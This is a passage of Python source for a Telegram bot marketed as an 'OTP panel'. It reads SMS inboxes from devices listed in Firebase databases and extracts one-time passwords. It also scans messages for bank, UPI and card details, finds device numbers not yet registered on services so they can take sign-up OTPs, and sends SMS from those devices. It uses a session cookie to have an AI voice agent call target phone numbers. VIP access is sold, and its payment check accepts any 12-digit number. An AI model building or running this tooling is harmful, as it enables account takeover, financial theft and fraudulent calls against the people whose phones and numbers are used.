        await wait_msg.edit_text(f"❌ <b>OTP Error:</b>\n{str(e)[:200]}", parse_mode="HTML")
        if browser: await browser.close()
        return ConversationHandler.END

async def process_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prompt_text = update.message.text.strip()
    session_id = context.user_data.get('session_id')
    wait_msg = await update.message.reply_text("⏳ Generating AI Agent on Backend...")
    headers = {"Content-Type": "application/json", "Referer": "https://omnidim.io/agents", "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://omnidim.io/api/bot/create", json={"prompt": prompt_text, "flow_type": "prompt"}, headers=headers) as resp:
                if resp.status in [200, 201]:
                    json_data = await resp.json()
                    new_bot_id = json_data.get("id")
                    if new_bot_id:
                        context.user_data['active_bot_id'] = new_bot_id
                        try: await session.post("https://omnidim.io/api/bot/update", json={"bot_id": str(new_bot_id), "changes": {"context_breakdown": [{"context_title": "Identity & Purpose", "context_body": prompt_text}]}}, headers=headers)
                        except: pass
                        await wait_msg.edit_text(f"📱 <b>Step 4:</b> Agent Ready! (ID: {new_bot_id})\nAb <b>Target Phone Number</b> bhejein (Format: +919021333450):", parse_mode="HTML")
                        return WAIT_NUMBER
                    else:
                        await wait_msg.edit_text("❌ Agent Created but ID not found.")
                        return ConversationHandler.END
                else:
                    await wait_msg.edit_text(f"❌ Failed to create Agent. HTTP Code: {resp.status}")
                    return ConversationHandler.END
    except Exception as e:
         await wait_msg.edit_text(f"❌ API Error: {str(e)[:200]}")
         return ConversationHandler.END

async def process_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_number = update.message.text.strip()
    active_bot_id = context.user_data.get('active_bot_id')
    session_id = context.user_data.get('session_id')
    if not target_number.startswith("+"): target_number = "+" + target_number
    wait_msg = await update.message.reply_text(f"🚀 Dispatching Call to <b>{target_number}</b>...", parse_mode="HTML")
    headers = {"Content-Type": "application/json", "Referer": f"https://omnidim.io/agent/{active_bot_id}", "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://omnidim.io/api/bot/dispatch/call", json={"user_number": target_number, "bot_id": active_bot_id, "custom_json_variables": {}}, headers=headers, allow_redirects=False) as resp:
                if resp.status in [301, 302, 303] or "login" in str(resp.url):
                    await wait_msg.edit_text("❌ <b>Call Failed:</b> Session expired. Try /call again.", parse_mode="HTML")
                    return ConversationHandler.END
                if resp.status in [200, 201]:
                    await wait_msg.edit_text(f"✅ <b>CALL INITIATED!</b>\nAI Agent is dialing <code>{target_number}</code> right now.\n\nType /call to run again.", parse_mode="HTML")
                else:
                    await wait_msg.edit_text(f"❌ <b>Call Failed.</b> (Code {resp.status})", parse_mode="HTML")
    except Exception as e:
        await wait_msg.edit_text(f"❌ Fatal Error: {str(e)[:200]}", parse_mode="HTML")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if context.user_data.get('context'): await context.user_data['context'].close()
        if context.user_data.get('browser'): await context.user_data['browser'].close()
        if context.user_data.get('playwright'): await context.user_data['playwright'].stop()
    except: pass
    await update.message.reply_text("Action cancelled.")
    return ConversationHandler.END

# ==========================================
# 💳 PAYMENT & CHECKOUT HANDLERS (STARS)
# ==========================================
async def precheckout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.pre_checkout_query
    if query.invoice_payload != "vip_1_month_payload":
        await query.answer(ok=False, error_message="Invalid payload request.")
        return
    await query.answer(ok=True)

async def successful_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    uinfo = all_users.get(chat_id, {})
    current_vip = uinfo.get("vip_until", 0.0)
    if current_vip < time.time(): current_vip = time.time()
    uinfo["vip_until"] = current_vip + (30 * 86400)
    save_user(chat_id)
    await update.message.reply_text("🎉 **PAYMENT SUCCESSFUL!**\nAapka **30 Dino ka VIP access** unlock ho gaya hai!", parse_mode="Markdown", reply_markup=get_reply_menu(chat_id))

# ==========================================
# 🤖 TELEGRAM COMMAND & CALLBACK HANDLERS
# ==========================================

async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    if chat_id in ADMIN_IDS: await update.message.reply_text("SUPER ADMIN MENU:", reply_markup=admin_keyboard())

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id  = update.effective_chat.id
    user = update.effective_user
    args = ctx.args

    ref_id = None
    if args and args[0].startswith("ref_"):
        try: ref_id = int(args[0].split("_")[1])
        except: pass

    if chat_id not in all_users:
        all_users[chat_id] = {"name": user.first_name, "username": user.username or "", "joined_at": datetime.now().strftime("%d %b %Y"), "verified": False, "referrals": 0, "vip_target": 20, "coins": 0, "vip_until": 0.0, "wishlist": [], "custom_dbs": [], "pending_ref": ref_id}
        save_user(chat_id)
    
    if not await check_force_join(ctx.bot, chat_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle niche diye gaye sabhi Channels aur Group join karne honge. Join karke '✅ I have joined' par click karein.", reply_markup=get_force_join_kb(), parse_mode="Markdown")
        return

    msg = f"🔥 **OTP PANEL PRO (VANTAGE EDITION)** 🔥\n━━━━━━━━━━━━━━━━━━\nWelcome Master {user.first_name}!\n\nSystem is connected and fully optimized.\n🆓 **Free Users:** Custom Panels add karein.\n👑 **VIP Users:** Global Panels aur Search Number access karein."
    await update.message.reply_text(msg, reply_markup=get_reply_menu(chat_id), parse_mode="Markdown")

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    query   = update.callback_query
    data    = query.data or ""
    chat_id = query.message.chat_id
    users_db = all_users

    try:
        # 🛡 VERIFY JOIN LOGIC
        if data == "check_join":
            if await check_force_join(ctx.bot, chat_id):
                uinfo = users_db.get(chat_id, {})
                if not uinfo.get("verified", False):
                    uinfo["verified"] = True
                    ref_id = uinfo.get("pending_ref")
                    if ref_id and ref_id in users_db and ref_id != chat_id:
                        users_db[ref_id]["referrals"] += 1
                        users_db[ref_id]["coins"] += 10
                        try: await ctx.bot.send_message(ref_id, f"🎉 **NEW VERIFIED REFERRAL!**\n💰 **+10 Coins added!**")
                        except: pass
                        target = users_db[ref_id].get("vip_target", 20)
                        if users_db[ref_id]["referrals"] >= target:
                            users_db[ref_id]["vip_until"] = time.time() + (24 * 3600)
                            users_db[ref_id]["vip_target"] = target + 10 
                            try: await ctx.bot.send_message(ref_id, "🎉 **VIP UNLOCKED!** 24 Hours VIP Access granted!")
                            except: pass
                        save_user(ref_id)
                    save_user(chat_id)
                await query.answer("Welcome!", show_alert=True)
                await safe_edit(query, "✅ Validation Successful. Send /start to access menu.")
            else: 
                await query.answer("❌ Aapne abhi tak saare Channels join nahi kiye hain ya Bot Admin nahi hai!", show_alert=True)
            return

        if not await check_force_join(ctx.bot, chat_id):
            return await query.answer("Aap channels se left ho gaye hain!", show_alert=True)

        await query.answer()

        if data == "noop": return
        if data == "close_msg":
            try: await query.message.delete()
            except: pass
            return

        if data == "cancel_scan":
            if chat_id in pending_action and pending_action[chat_id].get("action") == "auto_check":
                pending_action[chat_id]["status"] = "stopped"
            return await safe_edit(query, "🛑 **Scan Stopping...** Please wait.", parse_mode="Markdown")

        # ⭐ WISHLIST
        if data.startswith("wish_add:"):
            dev_id = data.split(":")[1]
            wl = users_db.setdefault(chat_id, {}).setdefault("wishlist", [])
            if dev_id not in wl: wl.append(dev_id)
            save_user(chat_id)
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{dev_id}")], [InlineKeyboardButton("❌ Remove from Wishlist", callback_data=f"wish_rem:{dev_id}")], [InlineKeyboardButton("🔙 Back to List",  callback_data="home")]])
            return await safe_edit(query, query.message.text, reply_markup=kb)
            
        if data.startswith("wish_rem:"):
            dev_id = data.split(":")[1]
            wl = users_db.setdefault(chat_id, {}).setdefault("wishlist", [])
            if dev_id in wl: wl.remove(dev_id)
            save_user(chat_id)
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{dev_id}")], [InlineKeyboardButton("⭐ Add to Wishlist", callback_data=f"wish_add:{dev_id}")], [InlineKeyboardButton("🔙 Back to List",  callback_data="home")]])
            return await safe_edit(query, query.message.text, reply_markup=kb)

        # 📄 PAGINATION
        if data == "home":
            pending_action.pop(chat_id, None)
            devices = await get_all_devices(chat_id)
            return await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")

        if data.startswith("pg:"):
            page = int(data[3:])
            devices = await get_all_devices(chat_id)
            return await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page), parse_mode="HTML")

        if data == "online":
            devices = await get_all_devices(chat_id)
            return await safe_edit(query, f"ONLINE NUMBERS\n━━━━━━━━━━━━━━━━━━\nClick a number to connect:", reply_markup=online_only_keyboard(devices))

        if data.startswith("cp:"): return await query.answer(f"OTP: {data[3:]}", show_alert=True)

        if data.startswith("sel:"):
            dev_id = data[4:]
            device = next((d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.id == dev_id), None)
            if not device: return await query.answer("Device not found!", show_alert=True)
            
            label = device_label(device)
            status = "Online" if device.status == "online" else "Offline"
            bat = f"{bat_emoji(device.battery)} {device.battery}%"
            text = f"DEVICE DASHBOARD\n━━━━━━━━━━━━━━━━━━\nNumber  : {label}\nStatus  : {status}\nBattery : {bat}\nServer  : {device.db_tag}\n━━━━━━━━━━━━━━━━━━\nClick View Inbox to fetch OTPs manually."
            
            wl = users_db.get(chat_id, {}).get("wishlist", [])
            wish_text = "❌ Remove from Wishlist" if dev_id in wl else "⭐ Add to Wishlist"
            wish_cb = f"wish_rem:{dev_id}" if dev_id in wl else f"wish_add:{dev_id}"
            
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{dev_id}")], [InlineKeyboardButton(wish_text, callback_data=wish_cb)], [InlineKeyboardButton("🔙 Back to List",  callback_data="home")]])
            return await safe_edit(query, text, reply_markup=kb)

        # 📩 INBOX VIEWER
        if data.startswith("msgs:"):
            dev_id = data.split(":")[1]
            device = next((d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.id == dev_id), None)
            if not device: return await query.answer("Device not found in active list!", show_alert=True)
                
            label = device_label(device)
            smss = await get_device_sms(device, limit=10)
            back_btn = InlineKeyboardButton("🔙 Back", callback_data=f"sel:{dev_id}")
            refresh_btn = InlineKeyboardButton("🔄 Refresh Inbox", callback_data=data)
            
            if not smss: return await safe_edit(query, f"📭 **Inbox Empty**\n📱 Number: `{label}`\n\nRefresh dabate rahein.", reply_markup=InlineKeyboardMarkup([[refresh_btn, back_btn]]), parse_mode="Markdown")
                
            header = f"📩 **FAST INBOX (VANTAGE)**\n━━━━━━━━━━━━━━━━━━\n📱 **Number:** `{label}`\n━━━━━━━━━━━━━━━━━━\n\n"
            body_parts, otp_buttons = [], []
            for sms in smss:
                block, otp, bank = format_sms_block(sms, label)
                body_parts.append(block)
                if otp: otp_buttons.append([InlineKeyboardButton(f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
            
            full_text = header + ("\n━━━━━━━━━━━━━━━━━━\n").join(body_parts)
            if len(full_text) > 4000: full_text = full_text[:4000] + "\n\n...[Truncated]"
            
            otp_buttons.append([refresh_btn, back_btn])
            return await safe_edit(query, full_text, reply_markup=InlineKeyboardMarkup(otp_buttons), parse_mode="HTML")

        # ⚡ AUTO CHECKER
        if data == "open_checker_menu":
            return await safe_edit(query, "<b>Select Checker (Manual Bulk)</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")

        if data == "open_auto_checker_menu":
            return await safe_edit(query, "🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to aggressively scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")

        if data.startswith("chk_srv:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "check_number_input", "service": service}
            return await safe_edit(query, f"Send a 10 digit number OR multiple numbers (separated by space) to manually check on {service.capitalize()}:\n\n_Press Cancel to stop_", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="close_msg")]]), parse_mode="Markdown")

        if data.startswith("auto_fb:"):
            service = data.split(":")[1]
            pending_action[chat_id] = {"action": "auto_check", "status": "running"}
            seen_set = user_seen_unreg.setdefault(chat_id, set())

            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 <i>Fetching ONLINE devices...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Scan", callback_data="cancel_scan")]]), parse_mode="HTML")
            all_devices = await get_all_devices(chat_id)
            if not all_devices: return await safe_edit(query, "❌ No devices found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            fresh_devices = [d for d in all_devices if d.status == "online" and d.numbers]
            random.shuffle(fresh_devices)
            if len(seen_set) > 5000: seen_set.clear() 
            fresh_devices = [d for d in fresh_devices if d.numbers[0] not in seen_set]
            
            if not fresh_devices: return await safe_edit(query, "✅ Saare active numbers check ho chuke hain.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))

            check_pool = fresh_devices[:50] 
            await safe_edit(query, f"🔥 <b>SMART AUTO-CHECKER</b>\n━━━━━━━━━━━━━━━━━━\n📡 Scanning {len(check_pool)} Active Numbers...\n⚡ <i>Hitting APIs concurrently...</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Scan", callback_data="cancel_scan")]]), parse_mode="HTML")
            
            found_unreg, final_res, final_dev, final_num = False, None, None, ""
            
            for i in range(0, len(check_pool), 15):
                state = pending_action.get(chat_id, {})
                if state.get("action") == "auto_check" and state.get("status") == "stopped":
                    return await safe_edit(query, "❌ **Auto-Check Cancelled!**", parse_mode="Markdown")

                batch = check_pool[i:i+15]
                tasks = [check_number_api(service, d.numbers[0]) for d in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for d, res in zip(batch, results):
                    if isinstance(res, dict) and not res.get("status") == "error":
                        is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                        if not is_reg:
                            found_unreg, final_res, final_dev, final_num = True, res, d, d.numbers[0]
                            break
                if found_unreg: break
                        
            if found_unreg:
                seen_set.add(final_num)
                await safe_edit(query, f"🔥 **ZERO-DAY HACKER MODE**\n━━━━━━━━━━━━━━━━━━\n🎯 **Unregistered Found:** `+{final_num[-10:]}`\n\n💉 *Injecting Wakeup SMS...*", parse_mode="Markdown")
                await fb_send_sms(final_dev, final_num, f"Ready for {service.upper()} OTP. Keep phone active.")
                res_text = format_checker_result(service, final_num, False, final_res.get("ms", 0), False, "")
                kb = [[InlineKeyboardButton("📩 View Fast Inbox", callback_data=f"msgs:{final_dev.id}")], [InlineKeyboardButton("🔄 Find Another", callback_data=data)], [InlineKeyboardButton("🏠 Main Menu", callback_data="home")]]
                return await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
            else:
                return await safe_edit(query, f"<b>✅ ALL REGISTERED</b>\n\nScanned {len(check_pool)} fresh active numbers. ALL are registered.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Scan Again", callback_data=data)], [InlineKeyboardButton("❌ Close", callback_data="close_msg")]]), parse_mode="HTML")

        # 🗑 CUSTOM PANELS & ADMIN
        if data.startswith("del_panel:"):
            idx_to_del = int(data.split(":")[1])
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if 0 <= idx_to_del < len(dbs): dbs.pop(idx_to_del); save_user(chat_id)
            dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
            if not dbs: return await safe_edit(query, "You have no custom panels left.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Close", callback_data="close_msg")]]))
            kb = [[InlineKeyboardButton(f"❌ Delete: {(db if isinstance(db, str) else db.get('url', ''))[:25]}...", callback_data=f"del_panel:{i}")] for i, db in enumerate(dbs)]
            kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
            return await safe_edit(query, "🗑 **Delete Custom Panels**:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

        if data == "sa_add_global_panel" and chat_id in ADMIN_IDS:
            pending_action[chat_id] = {"action": "sa_set_global_panel"}
            return await safe_edit(query, "ADD GLOBAL PANEL\n━━━━━━━━━━━━━━━━━━\nApna Firebase URL bhejein.\nCancel: /cancel", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_refresh")]]))

        if data == "sa_view_user_panels" and chat_id in ADMIN_IDS:
            msg_text = "USERS CUSTOM PANELS\n━━━━━━━━━━━━━━━━━━\n\n"
            for uid, uinfo in users_db.items():
                dbs = get_user_dbs(uinfo)
                if dbs:
                    msg_text += f"User: {uid}\n"
                    for db in dbs: msg_text += f"{db}\n"
                    msg_text += "\n"
            if len(msg_text) > 4000: msg_text = msg_text[:4000] + "\n...[Truncated]"
            return await safe_edit(query, msg_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="admin_refresh")]]))

    except Exception: pass

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    text    = (update.message.text or "").strip()
    
    if not await check_force_join(ctx.bot, chat_id):
        return await update.message.reply_text("⚠️ **ACCESS DENIED**\n\nAapko bot use karne ke liye pehle channels join karne honge.", reply_markup=get_force_join_kb(), parse_mode="Markdown")

    users_db = all_users
    uinfo = users_db.get(chat_id, {})
    is_vip = uinfo.get("vip_until", 0) > time.time()
    is_admin = chat_id in ADMIN_IDS

    if is_spamming(chat_id): return

    # 🔥 THE NEW UPI QR PAYMENT SYSTEM 🔥
    if text == "💳 Buy VIP (UPI/QR)":
        pending_action.pop(chat_id, None)
        upi_id = SYS_SETTINGS.get("upi_id", "your_upi_id_here@ybl")
        amount = SYS_SETTINGS.get("vip_price", 1.00)
        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi://pay?pa={upi_id}&pn=OTPPanel&am={amount}&cu=INR"
        
        msg = (
            f"🌟 **VIP SUBSCRIPTION (₹{amount} ONLY)** 🌟\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"1. Niche diye gaye QR Code ko scan karein ya UPI ID par ₹{amount} pay karein.\n"
            f"👉 **UPI ID:** `{upi_id}`\n\n"
            f"2. Payment karne ke baad apna **12-digit UTR / Reference Number** yahan type karein:\n\n"
            f"_Type 'Cancel' to stop._"
        )
        pending_action[chat_id] = {"action": "verify_utr"}
        await update.message.reply_photo(photo=qr_url, caption=msg, parse_mode="Markdown")
        return

    # 🔥 TELEGRAM STARS PAYMENT SYSTEM 🔥
    if text == "💎 Buy VIP (Stars)":
        price_in_stars = SYS_SETTINGS.get("vip_price_stars", 50)
        prices = [LabeledPrice("1 Month VIP Access", price_in_stars)]
        try:
            await ctx.bot.send_invoice(
                chat_id=chat_id, title="VIP Access (1 Month)", description="Unlock Unlimited Global Panels & Search features for 30 days!",
                payload="vip_1_month_payload", provider_token="", currency="XTR", prices=prices
            )
        except Exception as e: await update.message.reply_text(f"❌ Payment init failed: {e}")
        return

    if text == "🌐 Global Devices List":
        pending_action.pop(chat_id, None)
        if not is_vip and not is_admin:
            target = uinfo.get("vip_target", 20)
            return await update.message.reply_text(f"❌ **VIP ONLY FEATURE**\n\nGlobal Panels sirf VIPs ke liye hain.\nVIP banne ke liye apne Referral Link se {target} dosto ko invite karein, ya '💳 Buy VIP' se VIP kharidein!", parse_mode="Markdown")
            
        devices = await get_all_devices(chat_id)
        if not devices: return await update.message.reply_text("⏳ **Live Booting...**\nThodi der baad try karein.")
        return await update.message.reply_text(device_list_header(devices, 0, "🌐 GLOBAL DEVICES"), reply_markup=device_list_keyboard(devices, 0), parse_mode="HTML")

    if text == "🏦 Bank/Cards Scanner":
        wait_msg = await update.message.reply_text("⏳ Scanning all devices for recent Bank & UPI Transactions...")
        devices = await get_all_devices(chat_id)
        bank_alerts = []
        for d in devices[:50]: 
            smss = await get_device_sms(d, limit=20)
            for sms in smss:
                body = sms.get("body") or sms.get("message") or ""
                bank_info = extract_bank_info(body)
                card_info = extract_card_info(body)
                if bank_info or card_info:
                    bank_alerts.append(f"📱 {d.numbers[0] if d.numbers else d.id[:6]}\n{bank_info or ''} {card_info or ''}\nDate: {sms_date(sms)}\n")
        
        if not bank_alerts: return await safe_edit(wait_msg, "📭 No recent Bank/UPI SMS found across devices.")
        res = "🏦 <b>VANTAGE BANK & CARDS TRACKER</b>\n━━━━━━━━━━━━━━━━━━\n\n" + "\n".join(bank_alerts[:20])
        return await safe_edit(wait_msg, res, parse_mode="HTML")

    if text == "🔍 Search Number":
        if not is_vip and not is_admin:
            target = uinfo.get("vip_target", 20)
            return await update.message.reply_text(f"❌ **VIP ONLY FEATURE**\n\nNumber Search sirf VIPs ke liye hai.\nVIP banne ke liye apne Referral Link se {target} dosto ko invite karein!", parse_mode="Markdown")
        pending_action[chat_id] = {"action": "search_number_input"}
        return await update.message.reply_text("🔍 **SEARCH NUMBER**\n\nKripya 10-digit number enter karein jisko aap dhundhna chahte hain:\n\n_Type 'Cancel' to stop._", parse_mode="Markdown")

    if text == "⭐ My Wishlist":
        pending_action.pop(chat_id, None)
        wishlist_ids = uinfo.get("wishlist", [])
        if not wishlist_ids: return await update.message.reply_text("📭 Aapki Wishlist khaali hai!\nKisi bhi number ke 'Device Info' me jakar use ⭐ Add to Wishlist karein.")
        wish_devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.id in wishlist_ids]
        if not wish_devices: return await update.message.reply_text("📭 Aapke wishlist kiye hue numbers abhi Offline hain ya Database se hat gaye hain.")
        return await update.message.reply_text(device_list_header(wish_devices, 0, "⭐ MY WISHLIST"), reply_markup=device_list_keyboard(wish_devices, 0), parse_mode="HTML")

    if text == "⚡ Auto-Check Panels":
        pending_action.pop(chat_id, None)
        return await update.message.reply_text("🔥 <b>SMART AUTO-CHECKER (Zero-Day Hacker Mode)</b>\n━━━━━━━━━━━━━━━━━━\nSelect service to scan live numbers:", reply_markup=get_checker_menu(prefix="auto_fb:"), parse_mode="HTML")

    if text == "Manual Checker":
        pending_action.pop(chat_id, None)
        return await update.message.reply_text("<b>Select Manual Checker</b>", reply_markup=get_checker_menu(prefix="chk_srv:"), parse_mode="HTML")

    if text == "🎁 Refer & Earn VIP":
        ref_count = uinfo.get("referrals", 0)
        target = uinfo.get("vip_target", 20)
        ref_link = f"https://t.me/{ctx.bot.username}?start=ref_{chat_id}"
        msg = f"🎁 **REFER & EARN VIP ACCESS**\n━━━━━━━━━━━━━━━━━━\n👤 **Your Referrals:** {ref_count} / {target}\n💰 **Total Coins:** {uinfo.get('coins', 0)}\n\nApne {target} dosto ko invite karein aur **24 Ghante ke liye Unlimited Global Panels & Search** ka access paayein!\n\n🔗 **Share Your Link:**\n`{ref_link}`"
        return await update.message.reply_text(msg, parse_mode="Markdown")

    if text == "Add Custom Panel":
        pending_action[chat_id] = {"action": "set_personal_db"}
        return await update.message.reply_text("➕ **ADD CUSTOM PANELS**\n━━━━━━━━━━━━━━━━━━\nApni Firebase URLs bhejein.\n\nType 'Cancel' to stop.", parse_mode="Markdown")

    if text == "Delete Custom Panel":
        dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
        if not dbs: return await update.message.reply_text("You haven't added any custom panels to delete.")
        kb = [[InlineKeyboardButton(f"❌ Delete: {(db if isinstance(db, str) else db.get('url', ''))[:25]}...", callback_data=f"del_panel:{i}")] for i, db in enumerate(dbs)]
        kb.append([InlineKeyboardButton("Close", callback_data="close_msg")])
        return await update.message.reply_text("🗑 **Delete Custom Panels**:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    if text == "Admin Panel" and chat_id in ADMIN_IDS:
        total = len(users_db)
        msg_text = f"ADMIN PANEL (Private)\n━━━━━━━━━━━━━━━━━━\nTotal Users    : {total}\n━━━━━━━━━━━━━━━━━━\nUpdated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Add Global Panel", callback_data="sa_add_global_panel")], [InlineKeyboardButton("View User Panels", callback_data="sa_view_user_panels")], [InlineKeyboardButton("Close", callback_data="close_msg")]])
        return await update.message.reply_text(msg_text, reply_markup=kb)

    if text.lower() in ("/cancel", "cancel"):
        if chat_id in pending_action:
            pending_action.pop(chat_id)
            return await update.message.reply_text("✅ Action cancelled.", reply_markup=get_reply_menu(chat_id))
        else: return await update.message.reply_text("No pending action.")

    state = pending_action.get(chat_id)
    if not state: return
    action = state.get("action")
    
    # 🔥 UTR AUTO-VERIFICATION HANDLING
    if action == "verify_utr":
        utr = re.sub(r"\D", "", text)
        if len(utr) != 12:
            return await update.message.reply_text("❌ **Invalid UTR!** UTR ya Reference number exactly 12 digits ka hona chahiye. Dobara try karein ya 'Cancel' likhein.", parse_mode="Markdown")
        
        pending_action.pop(chat_id)
        current_vip = uinfo.get("vip_until", 0.0)
        if current_vip < time.time(): current_vip = time.time()
        all_users[chat_id]["vip_until"] = current_vip + (30 * 86400)
        save_user(chat_id)
        
        await update.message.reply_text(f"✅ **PAYMENT VERIFIED!**\n\nUTR: `{utr}` has been accepted.\nAapka **30 Days Unlimited VIP Plan** activate kar diya gaya hai! 🎉", parse_mode="Markdown", reply_markup=get_reply_menu(chat_id))
        
        for adm in ADMIN_IDS:
            try: await ctx.bot.send_message(adm, f"💰 **NEW VIP PAYMENT RECEIVED!**\nUser ID: `{chat_id}`\nUsername: @{update.effective_user.username}\nUTR: `{utr}`\nAmount: ₹{SYS_SETTINGS.get('vip_price', 1)}\nStatus: 30 Days VIP Activated Automatically.", parse_mode="Markdown")
            except: pass
        return
    
    if action == "search_number_input":
        search_term = re.sub(r"\D", "", text)
        if len(search_term) < 4: return await update.message.reply_text("❌ Please enter at least 4 digits of the number to search.")
            
        pending_action.pop(chat_id)
        wait_msg = await update.message.reply_text(f"⏳ Searching databases for `{search_term}`...", parse_mode="Markdown")
        
        all_devices = await get_all_devices(chat_id)
        found_devs = [d for d in all_devices if any(search_term in num for num in d.numbers)]
        if not found_devs: return await wait_msg.edit_text(f"📭 No devices found containing `{search_term}`.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Close", callback_data="close_msg")]]))
            
        rows = [[InlineKeyboardButton(f"{'🟢' if d.status=='online' else '🔴'} [{d.db_tag}] {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in found_devs[:15]]
        rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
        return await wait_msg.edit_text(f"🔍 **Search Results for `{search_term}`:**\nSelect a number to connect:", reply_markup=InlineKeyboardMarkup(rows), parse_mode="Markdown")

    if action == "check_number_input":
        raw_nums = re.sub(r"\D", " ", text).split()
        target_nums = list(set([num[-10:] for num in raw_nums if len(num) >= 10]))
        if not target_nums: return await update.message.reply_text("❌ Invalid input!")
        
        service = state["service"]
        pending_action.pop(chat_id)
        
        if len(target_nums) == 1:
            number = target_nums[0]
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Checking {number}...")
            res = await check_number_api(service, number)
            is_error = res.get("status") == "error"
            ms = res.get("ms", 0)
            is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
            res_text = format_checker_result(service, number, is_reg, ms, is_error, res.get("message", ""))
            kb = []
            if not is_reg and not is_error: kb.append([InlineKeyboardButton("🔍 Find this Number in Panels", callback_data=f"search_num:{number}")])
            kb.append([InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")])
            return await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        else:
            total_bulk = len(target_nums)
            wait_msg = await update.message.reply_text(f"{SYS_SETTINGS.get('check_anim', '⚡')} Bulk Checking {total_bulk} numbers on {service.capitalize()}...")
            bulk_results = []
            for i in range(0, total_bulk, 100):
                batch = target_nums[i:i+100]
                tasks = [check_number_api(service, num) for num in batch]
                res_list = await asyncio.gather(*tasks, return_exceptions=True)
                for num, res in zip(batch, res_list):
                    if isinstance(res, Exception) or res.get("status") == "error":
                        bulk_results.append(f"❌ <code>{num}</code> - Error"); continue
                    is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
                    bulk_results.append(f"{'🔴' if is_reg else '🟢'} <code>{num}</code> - {'Reg' if is_reg else 'UNREG'}")
                await asyncio.sleep(0.5)
            res_text = f"<b>📊 BULK CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n" + "\n".join(bulk_results)
            if len(res_text) > 4000: res_text = res_text[:4000] + "\n...[Truncated]"
            kb = [[InlineKeyboardButton("🔄 Check Another", callback_data=f"chk_srv:{service}"), InlineKeyboardButton("🏠 Select Checker", callback_data="open_checker_menu")]]
            return await wait_msg.edit_text(res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

    if action == "sa_set_global_panel" and chat_id in ADMIN_IDS:
        pending_action.pop(chat_id)
        urls = re.findall(r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', text)
